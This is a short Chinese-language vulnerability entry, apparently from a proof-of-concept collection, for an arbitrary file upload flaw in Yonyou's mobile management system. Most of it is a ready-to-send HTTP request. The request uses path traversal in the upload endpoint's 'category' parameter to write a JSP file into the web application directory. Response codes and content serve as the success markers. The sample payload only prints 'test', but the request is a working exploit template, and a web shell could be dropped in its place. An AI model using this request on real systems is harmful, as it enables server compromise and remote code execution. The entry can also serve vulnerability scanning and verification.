﻿# 用友 移动管理系统 common任意文件上传

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /mobsm/common/upload?category=../webapps/nc_web/maupload/img HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Cache-Control: no-cache
Connection: close

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="123.jsp"
Content-Type: text/plain

<% out.println("test");%>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

> 响应代码特征：200

> 响应内容特征：.jsp

> 上传文件定位：

> 验证文件来源：用友 移动管理系统 common任意文件上传.poc
